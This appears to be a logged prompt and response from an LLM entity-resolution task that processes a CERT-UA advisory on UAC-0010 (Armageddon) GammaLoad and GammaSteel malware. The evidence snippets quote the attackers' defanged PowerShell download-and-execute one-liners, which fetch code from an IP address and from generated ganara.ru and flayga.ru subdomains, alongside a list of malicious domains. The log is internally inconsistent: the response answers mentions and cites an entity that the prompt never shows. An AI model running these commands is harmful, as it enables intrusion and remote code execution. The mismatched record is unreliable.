=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1, GammaLoad.PS1_v2]
E2. TRYxaEbX.ps1
M4. "PowerShell (powershell.exe)" (Software) — options: E2, E24, E25, E26 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E36, E37, E38, E39
M6. "atlantar.ru" (Domain) — options: E39, E41, E37, E46
M7. "motoristo.ru" (Domain) — options: E46, E42, E49, E37 — ctx: S8
M8. "moolin.ru" (Domain) — options: E36, E37, E39, E40
M9. "bubenci.ru" (Domain) — options: E46, E37, E54, E36
M10. "callsol.ru" (Domain) — options: E53, E44, E47, E37
M11. "clipperso.ru" (Domain) — options: E36, E37, E59, E46
M12. "cooperi.ru" (Domain) — options: E36, E37, E60, E61
M13. "detroito.ru" (Domain) — options: E36, E54, E38, E37
M14. "farafauler.ru" (Domain) — options: E39, E37, E65, E41
M15. "flayga.ru" (Domain) — options: E46, E37, E38, E36 — ctx: S4
M16. "ganara.ru" (Domain) — options: E39, E68, E38, E37 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E36, E54, E37, E46
M18. "hofsteder.ru" (Domain) — options: E36, E37, E71, E39
M19. "kilitro.ru" (Domain) — options: E36, E38, E37, E39
M20. "kurapat.ru" (Domain) — options: E36, E64, E44, E37
M21. "lnasfe.ru" (Domain) — options: E53, E76, E77, E37 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E36, E78, E37, E46
M23. "mafirti.ru" (Domain) — options: E36, E55, E37, E46
M24. "metanat.ru" (Domain) — options: E36, E64, E51, E37
M25. "mitlubald.ru" (Domain) — options: E36, E73, E37, E46
M26. "paparat.ru" (Domain) — options: E36, E64, E84, E37 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E46, E37, E78, E36
M28. "qkcew.ru" (Domain) — options: E36, E37, E53, E40
M29. "rncsq.ru" (Domain) — options: E36, E37, E87, E53
M30. "tarlit.ru" (Domain) — options: E46, E64, E37, E41
M31. "tbwelo.ru" (Domain) — options: E36, E37, E42, E46
M32. "wicksl.ru" (Domain) — options: E36, E37, E69, E53
M33. "xcqef.ru" (Domain) — options: E53, E37, E74, E36
M34. "nxkad.ru" (Domain) — options: E53, E86, E73, E37 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E95, E96, E97, E98
M36. "tools.nexcess.net" (Domain) — options: E104, E105, E106, E107
M37. "viewdns.info" (Domain) — options: E95, E99, E106, E113
M38. "www.portcheckers.com" (Domain) — options: E119, E120, E49, E121 — ctx: S7

=== RESPONSE (5.2s, in 4258 / out 652 tok, STOP) ===
{"m":"M1","id":"NEW","g":"PowerShell script used to steal files"}
{"m":"M2","id":"NEW","g":".NET malware used to steal browser authentication credentials"}
{"m":"M3","id":"NEW","g":"previously used data harvesting tool"}
{"m":"M4","id":"E24","g":null}
{"m":"M5","id":"NEW","g":"domain name"}
{"m":"M6","id":"NEW","g":"domain name"}
{"m":"M7","id":"NEW","g":"domain name"}
{"m":"M8","id":"NEW","g":"domain name"}
{"m":"M9","id":"NEW","g":"domain name"}
{"m":"M10","id":"NEW","g":"domain name"}
{"m":"M11","id":"NEW","g":"domain name"}
{"m":"M12","id":"NEW","g":"domain name"}
{"m":"M13","id":"NEW","g":"domain name"}
{"m":"M14","id":"NEW","g":"domain name"}
{"m":"M15","id":"NEW","g":"domain name"}
{"m":"M16","id":"NEW","g":"domain name"}
{"m":"M17","id":"NEW","g":"domain name"}
{"m":"M18","id":"NEW","g":"domain name"}
{"m":"M19","id":"NEW","g":"domain name"}
{"m":"M20","id":"NEW","g":"domain name"}
{"m":"M21","id":"NEW","g":"domain name"}
{"m":"M22","id":"NEW","g":"domain name"}
{"m":"M23","id":"NEW","g":"domain name"}
{"m":"M24","id":"NEW","g":"domain name"}
{"m":"M25","id":"NEW","g":"domain name"}
{"m":"M26","id":"NEW","g":"domain name"}
{"m":"M27","id":"NEW","g":"domain name"}
{"m":"M28","id":"NEW","g":"domain name"}
{"m":"M29","id":"NEW","g":"domain name"}
{"m":"M30","id":"NEW","g":"domain name"}
{"m":"M31","id":"NEW","g":"domain name"}
{"m":"M32","id":"NEW","g":"domain name"}
{"m":"M33","id":"NEW","g":"domain name"}
{"m":"M34","id":"NEW","g":"domain name"}
{"m":"M35","id":"NEW","g":"domain name"}
{"m":"M36","id":"NEW","g":"domain name"}
{"m":"M37","id":"NEW","g":"domain name"}
{"m":"M38","id":"NEW","g":"domain name"}
